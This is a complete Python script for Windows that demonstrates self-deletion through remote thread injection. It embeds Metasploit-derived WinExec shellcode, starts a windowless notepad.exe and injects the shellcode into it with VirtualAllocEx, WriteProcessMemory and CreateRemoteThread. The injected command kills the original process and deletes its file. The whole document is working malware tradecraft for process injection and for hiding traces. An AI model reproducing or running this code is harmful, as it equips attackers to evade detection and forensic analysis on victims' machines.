#!/usr/bin/env python
from __future__ import print_function, absolute_import, unicode_literals
import subprocess
from time import sleep
import os
import ctypes
import sys
from imp import is_frozen
__author__ = 'themson mester'


"""
WinExec shellcode sourced from the Metasploit Framework.
http://www.rapid7.com/db/modules/payload/windows/exec
Authors - vlad902 <vlad902 [at] gmail.com>, sf <stephenfewer [at] harmonysecurity.com>

I have modified "\x6a\x01" push 01 to "\x6a\x00" push 00 to unset uCmdShow
WinExec: http://msdn.microsoft.com/en-us/library/windows/desktop/ms687393(v=vs.85).aspx
UINT WINAPI WinExec(
                     _In_  LPCSTR lpCmdLine,
                     _In_  UINT uCmdShow
                    );

"""
SHELLCODE = b"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" + \
            b"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" + \
            b"\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" + \
            b"\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0" + \
            b"\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b" + \
            b"\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff" + \
            b"\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d" + \
            b"\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b" + \
            b"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44" + \
            b"\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b" + \
            b"\x12\xeb\x86\x5d\x6a\x00\x8d\x85\xb9\x00\x00\x00\x50\x68" + \
            b"\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95" + \
            b"\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb" + \
            b"\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

TARGET_PROCESS = b'notepad.exe'


def is_frozen_main():
    """Freeze detection Bool

    From www.py2exe.org/index.cgi/HowToDetermineIfRunningFromExe
    ThomasHeller posted to the py2exe mailing list
    :return: bool
    """

    return (hasattr(sys, "frozen") or  # new py2exe
            hasattr(sys, "importers")  # old py2exe
            or is_frozen("__main__"))  # tools/freeze


def get_state():
    """Get pid and path

    Acquire current process pid
    Check execution state (PE || script)
    Acquire current process file path
    :return: pid, path
    """
    current_pid = str(os.getpid())
    if is_frozen_main():
        current_path = sys.executable
    else:
        current_path = os.path.abspath(__file__)
    current_path = b'"' + current_path + b'"'  # handle paths with spaces, ^ escape will not
    return current_pid, current_path


def generate_shellcode(pid, path):
    """Finalize shellcode to be injected

    Set up cmd to kill PID and remove from disk
    :param pid:
    :param path:
    :return: str
    """
    nullbyte = b'\x00'
    cmd_string = b'cmd /c taskkill /F /PID > nul ' + pid + b' && ping 1.1.1.1 -n 1 -w 500 > nul & del /F /Q ' + path
    return bytearray(SHELLCODE + cmd_string + nullbyte)


def child_process(process_name=TARGET_PROCESS):
    """ Start windowless proccess in new process group

    :param process_name:
    :return: process pid
    """
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW  # Start process windowless
    try:
        process = subprocess.Popen([process_name], startupinfo=startupinfo,
                                   creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
    except OSError:
        exit()
    sleep(1)  # allow process load before injection
    return process.pid


def inject_rthread(shellcode, child_pid):
    """Inject shellcode into remote process as new thread

    NOTE: non-PEP8 and extraneous names are used to maintain clarity of Windows Function parameter names

    OpenProcess: http://msdn.microsoft.com/en-us/library/windows/desktop/ms684320(v=vs.85).aspx
    VitualAllocEx: http://msdn.microsoft.com/en-us/library/windows/desktop/aa366890(v=vs.85).aspx
    Memory Protection Constants: http://msdn.microsoft.com/en-us/library/windows/desktop/aa366786(v=vs.85).aspx
    WriteProcessMemory: http://msdn.microsoft.com/en-us/library/windows/desktop/ms681674(v=vs.85).aspx
    CreateRemoteThread: http://msdn.microsoft.com/en-us/library/windows/desktop/ms682437(v=vs.85).aspx

    :param shellcode:
    :param child_pid:
    :return: success bool
    """
    kernel32 = ctypes.windll.kernel32
    byte_length = len(shellcode)

    # OpenProcess  Arguments
    PROCESS_ALL_ACCESS = (0x000F0000L | 0x00100000L | 0xFFF)  # all access rights
    bInheritHandle = False  # do not inherit handle
    dwProcessId = child_pid  # pid of remote process

    # VirtualAllocEx Arguments
    lpAddress = None  # function determines alloc location
    dwSize = byte_length
    flAllocationType = 0x1000  # MEM_COMMIT
    flProtect = 0x40  # PAGE_EXECUTE_READWRITE

    # WriteProcessMemory Arguments
    lpBuffer = (ctypes.c_char * byte_length).from_buffer(shellcode)  # buffer of shell code chars
    nSize = byte_length
    lpNumberOfBytesWritten = None  # do not return byte writen length

    #CreateRemoteThread Arguments
    lpThreadAttributes = None  # use default security descriptor
    dwStackSize = 0  # use default stack size
    lpParameter = None  # no vars to pass
    dwCreationFlags = 0  # run thread immediately
    lpThreadId = None  # do not return thread identifier

    try:
        hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, bInheritHandle, dwProcessId)
        lpBaseAddress = kernel32.VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect)
        write_return = kernel32.WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten)

        if write_return != 0:
            kernel32.CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpBaseAddress,
                                        lpParameter, dwCreationFlags, lpThreadId)
            return True
        else:
            return False

    except Exception as e:
        print("ERROR: inject_rthread(): {}".format(e.args))
        return False


def clean_up():
    """manage clean up process

    get pid and path
    generate shellcode
    launch target process and return cpid
    inject into remote thread

    :return: success bool
    """
    pid, path = get_state()
    shell_code = generate_shellcode(pid, path)
    child_pid = child_process()
    return inject_rthread(shell_code, child_pid)


def main():
    print("Self-Deletion via remote thread injection demo.")
    clean_up()
    while 1:
        pass


if __name__ == "__main__":
    main()